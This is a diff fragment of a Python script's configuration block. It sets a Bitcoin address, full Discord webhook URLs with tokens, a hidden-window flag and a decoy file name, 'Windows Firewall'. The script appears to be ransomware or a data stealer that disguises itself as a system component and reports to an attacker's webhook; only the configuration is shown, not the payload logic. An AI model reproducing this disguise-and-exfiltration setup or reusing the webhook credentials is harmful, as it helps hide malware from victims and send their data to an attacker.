@@ -30,8 +30,8 @@ from datetime import datetime, timedelta
 from base64 import b64decode
 
 # Configuration
-BTC_ADDRESS = '3LsZH7LqxJMZBaVU9YoTLk8HNnUcmzE88v'
-webhookURL = "https://discord.com/api/webhooks/853056645164957716/zgHTM0Sq7cWT5FdULGAcCHtYJ9_I0Is6kRlhHH4Y3d_BEAdjNRXOm58aP07lEIali8MX"
+BTC_ADDRESS = ''
+webhookURL = "https://discord.com/api/webhooks/851299535376744508/0wT-ybEeehPndErZKpgWxIULAU9VJG-odOXiW5jyd4OM1-xy0Tw0UkkQQXDMfMRr2s6W"
 hiddenWindow = False
 FakeFileName = "Windows Firewall"
 
